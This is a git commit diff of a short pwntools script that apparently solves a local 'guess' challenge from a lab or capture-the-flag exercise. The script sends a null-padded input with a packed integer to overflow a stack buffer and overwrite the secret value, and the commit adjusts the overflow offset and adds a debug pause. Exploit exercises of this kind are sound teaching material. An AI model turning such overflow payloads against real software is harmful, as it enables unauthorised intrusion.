e0999f6f6006a1bcee2eaec587d246cef752db08
Chun-Ying Huang <huangant@gmail.com>
2025-01-01 16:24:34 +0800

    fix guess.py

--- procenv/guess.py
+++ procenv/guess.py
@@ -2,11 +2,14 @@
 
 from pwn import *
 
-r = process('guess');
+r = process('./guess');
 
 r.recvuntil('number: ');
 
+pause()
+
 myguess = 1234;
-r.sendline(str(myguess).encode('ascii').ljust(0xac-0x90, b'\0') + p32(myguess));
+#r.sendline(str(myguess).encode('ascii').ljust(0xac-0x90, b'\0') + p32(myguess));
+r.sendline(str(myguess).encode('ascii').ljust(0x30-0x14, b'\0') + p32(myguess));
 
 r.interactive();
